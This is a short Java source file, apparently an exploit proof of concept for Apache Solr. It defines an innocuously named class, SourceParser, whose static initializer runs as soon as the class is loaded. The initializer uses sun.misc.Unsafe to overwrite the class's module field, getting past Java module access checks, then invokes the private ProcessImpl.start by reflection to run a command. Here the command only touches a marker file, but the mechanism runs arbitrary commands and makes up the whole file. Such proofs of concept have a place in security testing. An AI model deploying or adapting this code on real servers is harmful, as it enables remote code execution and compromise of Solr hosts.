package zk_backup_0.configs.moduleconfig;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;
import sun.misc.Unsafe;

// Compiled only in the owned JDK target. The initializer creates one harmless
// fresh marker when the genuine Solr ClassLoader loads the exported class.
public class SourceParser {
    static {
        try {
            Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Unsafe unsafe = (Unsafe) unsafeField.get(null);
            long moduleOffset = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
            unsafe.getAndSetObject(SourceParser.class, moduleOffset, Object.class.getModule());

            Class<?> processClass = Class.forName("java.lang.ProcessImpl");
            Method start = processClass.getDeclaredMethod("start", String[].class, Map.class,
                String.class, ProcessBuilder.Redirect[].class, boolean.class);
            start.setAccessible(true);
            String[] command = {"/usr/bin/touch", "/tmp/module-target-solr-native-backup"};
            Process process = (Process) start.invoke(null, command, null, null, null, false);
            process.waitFor();
        } catch (Exception error) {
            throw new ExceptionInInitializerError(error);
        }
    }
}
